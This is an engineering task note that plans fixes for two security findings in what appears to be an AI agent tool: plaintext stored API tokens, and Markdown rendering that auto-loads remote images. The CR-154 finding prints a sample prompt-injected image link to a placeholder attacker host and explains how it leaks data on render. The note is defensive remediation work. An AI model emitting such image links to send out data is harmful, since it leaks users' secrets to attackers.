# Task 61: Security: secrets at rest and remote images in Markdown

- **Phase:** Phase 6: Security (last)
- **Depends on:** [Task 59: Security: tokens out of URLs, logs and the client](59-security-credential-hygiene.md)
- **Findings:** CR-117, CR-154
- **Effort:** L
- **Needs approval:** At-rest encryption (CR-117) is a design decision. Agree on key management with the owner first.

## Goal

Tokens and API keys are stored in plaintext and read directly by each integration. Agent-authored Markdown auto-loads remote images, which is an exfiltration channel.

## Findings

Each finding was re-verified against `refactor/prompt-engine-inconsistency-fix` at `abaa007`. The full original write-up (problem, evidence, suggested fix) is in [`docs/code-review.md`](../code-review.md); search for the CR id.

### CR-117 [Medium] Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts`

- **Status:** Open
- **Type:** Security
- **Effort:** L
- **Where:** lib/db/schema.sql:183-200, lib/db/schema.sql:202, lib/integrations/cursor/credentials.ts:9-16, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:27-29
- **What to do:** GitLab PATs, Jira tokens and `settings.cursor.api_key` are still plaintext, read directly from `db` by each integration, and `SELECT *` instance listing still pulls tokens into every routing call. Fix: add a `SecretStore`, the only reader of token columns, encrypting at rest with a key from `lib/config.ts`, and project tokens out of list queries. This is an owner design decision.
- **Fix after:** CR-118 ([Task 48](48-backend-dependency-injection.md))

### CR-154 [Medium] Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector)

- **Status:** Open
- **Type:** Security
- **Effort:** S
- **Where:** components/shared/Markdown.tsx:136-150
- **What to do:** `Markdown` still renders Streamdown with its default rehype pipeline (streamdown ^2.7.1, `harden` with `allowedImagePrefixes: ["*"]`) over agent, plan and MR content. A prompt-injected `![](https://attacker/?d=...)` is fetched automatically on render. Fix: pass explicit `rehypePlugins` that keep sanitize and configure `harden` with an image allowlist (or none) and `allowedProtocols: ["https","mailto"]`, or override `components.img` with a click-to-load placeholder.

## Done when

- [ ] Every finding above is fixed, or a remaining part is written up in the PR description.
- [ ] Each bug fix has a regression test (Vitest for `lib/`; at least a hook or utility test for UI where practical).
- [ ] Code follows [`docs/coding-patterns.md`](../coding-patterns.md).
- [ ] `npm run typecheck`, `npm run lint`, `npm test` and `npm run build` pass (before Task 02 lands, `npx tsc --noEmit` instead of `typecheck`).
- [ ] The status of each finding in [`docs/code-review.md`](../code-review.md) is updated (Fixed, with the PR link).
